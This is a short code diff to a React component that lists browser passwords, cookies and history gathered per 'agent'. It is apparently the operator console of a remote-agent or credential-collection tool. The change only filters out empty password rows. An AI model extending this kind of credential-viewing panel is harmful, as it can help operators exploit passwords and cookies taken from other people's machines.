@@ -82,6 +82,12 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
   const ck = usePagedData<BrowserCookie>(agentId, 'cookies');
   const hs = usePagedData<BrowserHistory>(agentId, 'history');
 
+  // Filter out entries where url, username, and password are all empty
+  const filteredPasswords = useMemo(() =>
+    pw.items.filter(p => p.url || p.username || p.password),
+    [pw.items]
+  );
+
   useEffect(() => { pw.fetchPage(true); }, [agentId]);
 
   const handleTabChange = useCallback((key: string) => {
@@ -149,7 +155,7 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
           </Tabs.List>
         </Tabs.ListContainer>
         <Tabs.Panel id="passwords">
-          {pw.items.length === 0 && !pw.loading ? (
+          {filteredPasswords.length === 0 && !pw.loading ? (
             <div className="text-center text-neutral-500 py-8">{t('othersoft.browser.noData')}</div>
           ) : (
             <div className="overflow-x-auto max-h-[600px] overflow-y-auto">
@@ -163,7 +169,7 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
                   </tr>
                 </thead>
                 <tbody>
-                  {pw.items.map((p, idx) => (
+                  {filteredPasswords.map((p, idx) => (
                     <tr key={idx} className="border-b border-neutral-100 dark:border-neutral-800 hover:bg-neutral-50 dark:hover:bg-neutral-900">
                       <td className="py-1.5 px-2"><Chip size="sm" variant="soft">{p.browser}</Chip></td>
                       <td className="py-1.5 px-2 max-w-[300px] truncate" title={p.url}>{p.url}</td>
